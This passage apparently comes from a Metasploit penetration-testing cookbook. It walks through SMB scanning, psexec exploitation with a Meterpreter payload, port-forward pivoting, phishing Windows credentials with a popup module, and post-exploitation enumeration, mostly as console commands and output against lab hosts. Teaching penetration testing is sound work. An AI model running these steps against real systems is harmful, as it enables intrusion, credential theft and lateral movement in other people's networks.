
```
msf auxiliary(tcp) > run

[+] 10.0.0.161:139 - 10.0.0.161:139 - TCP OPEN
[+] 10.0.0.161:135 - 10.0.0.161:135 - TCP OPEN
[+] 10.0.0.161:445 - 10.0.0.161:445 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tcp) >
```

3. Now that we know the target is running SMB, we can use the SMB Version Detection auxiliary module to display information about the system:

```
msf auxiliary(tcp) > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 10.0.0.161
RHOSTS => 10.0.0.161
msf auxiliary(smb_version) > run

[+] 10.0.0.161:445 - Host is running Windows 10 Enterprise (build:10586) (name:DESKTOP-OJI4NFS) (workgroup:WORKGROUP)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_version) >
```

4. With the information gathered, we can use the Microsoft Windows Authenticated User Code Execution exploit module with credentials collected during post-exploitation and try to compromise the target machine:

```
msf auxiliary(smb_version) > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 10.0.0.161
RHOST => 10.0.0.161
msf exploit(psexec) > set SMBUSER User
SMBUSER => User
msf exploit(psexec) > set SMBPASS P4ssw0rd
SMBPASS => P4ssw0rd
msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(psexec) > run

...

meterpreter > sysinfo
Computer : WINDOWS10
OS : Windows 10 (Build 10586).
Architecture : x86
System Language : pt_PT
Domain : WORKGROUP
Logged On Users : 2
Meterpreter : x86/windows
meterpreter >
```

## Port forwarding with Meterpreter

Discussing pivoting is never complete without talking about port forwarding. In this recipe, we will continue from our previous pivoting recipe and see how we can port forward the data and requests from the attacking machine to the internal network server via the target node. An important thing to note here is that we can use port forwarding to access various services of the internal server.

### Getting ready

We will start with the same scenario, which we discussed in the previous recipe. We have compromised the Linux server, and we have added the route information to forward all the data packets sent on the network through the Meterpreter session. Let's take a look at the route table:

```
msf > route

IPv4 Active Routing Table
======================

Subnet Netmask Gateway
------ ------- -------
10.0.0.0 255.255.255.0 Session 2

[*] There are currently no IPv6 routes defined.
msf >
```

So, our table is all set. Now we will have to set up port forwarding so that our request relays through to reach the internal network.

### How to do it...

1. For this recipe, we will turn on Internet Information Services on the target Windows 10 machine and try to access it through port forwarding:

![](img/6b6e557533100c0e47951d0e5e14c4ee_582_0.png)

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:
    -L <opt> Forward: local host to listen on
(optional).
Reverse: local host to connect to.
    -R Indicates a reverse port forward.
    -h Help banner.
    -i <opt> Index of the port forward entry to
interact with (see the "list" command).
    -l <opt> Forward: local port to listen on.
Reverse: local port to connect to.
    -p <opt> Forward: remote port to connect to.
Reverse: remote port to listen on.
    -r <opt> Forward: remote host to connect to.
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.161
[*] Local TCP relay created: :8080 <-> 10.0.0.161:80
meterpreter >
```

Successful execution of the command shows that a local TCP relay has been set up between the attacker and the internal server. The listener port on the attacker machine was set to 8080, and the service to access on the internal server is on port 80.

- 2. As we have already set the route information, the entire relay happens transparently. Now if we try to access the internal server through our browser by using the URL http://127.0.0.1:8080, we will be directed to the HTTP intranet service of the internal network:

![](img/6b6e557533100c0e47951d0e5e14c4ee_583_0.png)

Port forwarding can be very handy in situations when you have to run commands or applications that Metasploit does not provide. In such situations, you can use port forwarding to ease your task.

## Credential harvesting

During a penetration test, we are not always getting sessions with system or even administrator privileges; most of the time, we will end up with a session from a successful phish which is running with user privileges. That is when credential harvesting comes to our rescue. With credential harvesting, we will try to perform a phishing attack on the target to harvest usernames, passwords, and hashes that can be used to further compromise the organization.

### How to do it...

To harvest credentials, we will use the Windows Gather User Credentials post-exploitation module with which we are able to perform a phishing attack on the target by popping up a login prompt.

- 1. When the user types his/her credentials into the login prompt, they will be sent to our attacker machine:

```
msf > use post/windows/gather/phish_windows_credentials
msf post(phish_windows_credentials) > set SESSION 1
SESSION => 1
msf post(phish_windows_credentials) > run

[+] PowerShell is installed.
[*] Starting the popup script. Waiting on the user to fill in his credentials...
[+] #< CLIXML
```

2. On the target machine, we should see the login prompt, waiting for the user to fill in his/her credentials:

![](img/6b6e557533100c0e47951d0e5e14c4ee_585_0.png)

3. When the user fills in the login prompt, his/her credentials will be sent to our attacker machine:

```
[+] UserName Domain Password
--------- ------ --------
User WINDOWS10 P4ssw0rd

[*] Post module execution completed
msf post(phish_windows_credentials) >
```

Great! Looking at the output of the module, we can see that we were able to collect the user's credentials.

## Enumeration modules

After successfully compromising a target, our next task is to start enumeration. Getting a session is only the beginning; with each new compromise, our target has a plethora of information which we, as penetration testers, can use to try to escalate our privileges and start pivoting to other targets in the internal network.

### How to do it...

- 1. We will start enumeration by using the Windows Gather Installed Application Enumeration post-exploitation module, which will enumerate all installed applications:

```
msf > use post/windows/gather/enum_applications
msf post(enum_applications) > set SESSION 1
SESSION => 1
msf post(enum_applications) > run

[*] Enumerating applications installed on VAGRANT-2008R2

Installed Applications
====================
```

| Name | Version |
|---|---|
| 7-Zip 16.04 (x64) | 16.04 |
| Java 8 Update 144 | 8.0.1440.1 |
| Java 8 Update 144 (64-bit) | 8.0.1440.1 |
| Java Auto Updater | 2.8.144.1 |
| Java SE Development Kit 8 Update 144 (64-bit) | 8.0.1440.1 |
| ... | ... |

```
msf post(enum_applications) >
```

Looking at the output of the module, we can see how this could be useful during a penetration test. Knowing which applications are installed in the target will ease our task of finding possible privilege escalation exploits.

2. To further increase our chances of compromising the organization, we can use the Windows Gather SNMP Settings Enumeration post-exploitation module. This module will allow us to enumerate the SNMP service configuration, and enumerate the SNMP community strings, which can be used to compromise other targets in the network:

```
msf post(enum_applications) > use post/windows/gather/enum_snmp
msf post(enum_snmp) > set SESSION 1
SESSION => 1
msf post(enum_snmp) > run

..:
[*] No Traps are configured
[*] Post module execution completed
msf post(enum_snmp) >
```

3. Next, we can try to enumerate current and recently logged on Windows users using the Windows Gather Logged On User Enumeration post-exploitation module:

```
msf post(enum_snmp) > use post/windows/gather/enum_logged_on_users
msf post(enum_logged_on_users) > set SESSION 1
SESSION => 1
msf post(enum_logged_on_users) > run

[*] Running against session 1

Current Logged Users
===================
```

| SID | User |
|---|---|
| S-1-5-18 | NT AUTHORITY\SYSTEM |
| S-1-5-21-653170132-1988196614-1572848168-1002 | VAGRANT-2008R2\sshd_server |
| S-1-5-21-653170132-1988196614-1572848168-500 | VAGRANT-2008R2\Administrator |

```
..:
[*] Post module execution completed
msf post(enum_logged_on_users) >
```
